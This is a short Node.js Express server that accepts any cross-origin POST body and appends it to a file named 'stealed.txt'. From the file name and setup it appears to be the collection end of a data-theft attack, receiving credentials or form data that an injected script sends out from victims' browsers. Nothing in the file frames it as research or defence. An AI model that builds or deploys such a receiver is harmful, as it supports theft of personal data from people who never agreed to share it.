var fs = require('fs');

express = require('express');
app = express();
cors = require('cors')
bodyParser = require('body-parser')

app.use(cors());
app.use(bodyParser());
app.post('/', (req, res) => {
    fs.appendFile('./stealed.txt', JSON.stringify(req.body) + "\n");
    res.json({h: 1});
})

app.listen(3000, () => {
    console.log('server running')
})